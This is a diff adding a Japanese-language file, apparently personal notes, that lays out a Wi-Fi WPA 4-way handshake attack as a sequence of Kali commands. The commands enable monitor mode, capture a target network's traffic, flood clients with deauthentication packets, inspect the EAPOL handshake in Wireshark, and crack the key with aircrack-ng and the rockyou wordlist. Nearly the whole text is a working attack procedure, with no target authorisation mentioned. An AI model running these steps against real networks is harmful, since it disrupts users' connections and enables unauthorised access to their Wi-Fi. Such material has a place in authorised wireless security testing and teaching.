@@ -1,0 +1,70 @@
+～Wi-Fiアダプターを用いた4 way handshake attackの手順～
+
+ip addr
+
+iwconfig
+
+cat /etc/os-release
+
+airmon-ng check kill
+
+sudo airmon-ng start wlan0
+
+iwconfig
+
+sudo airodump-ng wlan0
+
+sudo airodump-ng wlan0 -d (BSSID)
+
+sudo airodump-ng -w hack1 -c (そのWi-Fiのチャンネル)　--bssid (BSSID) wlan0
+
+(ここからセカンドスクリーンを開く)
+
+sudo aireplay-ng --deauth 0 -a (BSSID) wlan0
+
+ls
+
+wireshark hack1-01.cap
+
+(wiresharkの画面内で)
+
+eapol
+
+(wiresharkで確認後ファーストスクリーンに戻ってくる)
+
+iwconfig
+
+sudo airmon-ng stop wlan0
+
+iwconfig
+
+ls
+
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
+
+(この時はまだ上記コマンドを実施しない)
+
+(セカンドスクリーンにとぶ)
+
+cd /usr/share/wordlists
+
+ls
+
+(kaliのアイコンをクリックし、wordlistsを入力)
+
+(ファーストスクリーンに飛ぶ)
+
+さっきのコマンド"aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt"を入力
+
+
+
+
+
+
+
+
+
+
+
+
+
